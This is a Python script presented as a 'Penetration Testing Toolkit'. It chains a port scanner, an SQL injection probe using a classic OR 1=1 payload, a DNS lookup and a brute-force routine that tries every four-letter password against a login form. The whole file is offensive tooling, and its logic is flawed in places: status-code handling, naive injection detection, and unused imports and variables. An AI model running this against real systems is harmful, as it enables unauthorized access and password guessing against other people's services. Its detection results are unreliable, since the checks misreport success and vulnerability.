import socket
import dns.resolver
import requests
import scapy.all as scapy
import itertools
import os
import time

def port_scan(target, ports):
    open_ports = []
    try:
        for port in ports:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((target, port))
            if result == 0:
                open_ports.append(port)
            sock.close()
        if open_ports:
            print(f"Open ports on {target}: {', '.join(map(str, open_ports))}")
        else:
            print(f"No open ports found on {target}")
    except socket.error as e:
        print(f"Socket error: {e}")

def vulnerability_scan(target):
    try:
        response = requests.get(target + "?id=1' OR 1=1 --")
        response.raise_for_status()
        if "error" in response.text.lower():
            print(f"SQL injection vulnerability detected on {target}")
        else:
            print(f"No SQL injection vulnerability detected on {target}")
    except requests.exceptions.RequestException as e:
        print(f"Request error: {e}")
        
def dns_enumerator(domain):
    try:
        answers = dns.resolver.resolve(domain, 'A')
        for rdata in answers:
            print(f"IP Address: {rdata}")
    except dns.resolver.NoAnswer:
        print("No IP addresses found")


def brute_force(target, username, password_length, charset):
    try:
        for attempt in itertools.product(charset, repeat=password_length):
            password = "".join(attempt)
            response = requests.post(target, data={"username": username, "password": password})
            response.raise_for_status()
            print(f"Attempt: {password}, Status Code: {response.status_code}")
            if response.status_code == 200:
                print(f"Password found: {password}")
                break
            elif response.status_code == 403:
                print(f"Brute force attack blocked by {target}")
                break
            time.sleep(1)  # Add a delay between requests
    except requests.exceptions.RequestException as e:
        print(f"Request error: {e}")

def main():
    
    print("Penetration Testing Toolkit")
    print("-------------------------------")

    target = "192.168.1.100"
    domain = "example.com"
    username = "admin"
    password_length = 4
    charset = "abcdefghijklmnopqrstuvwxyz"
    subdomains = ["www", "admin", "blog"]
    interface = "eth0"

    print("Running port scan...")
    port_scan(target, [20, 21, 22, 80, 443])

    print("\nRunning vulnerability scan...")
    vulnerability_scan("http://example.com")

    print("\nRunning DNS enumerator...")
    dns_enumerator(domain)

    print("\nRunning brute force attack...")
    brute_force("http://example.com/login", username, password_length, charset)

if __name__ == "__main__":
    main()



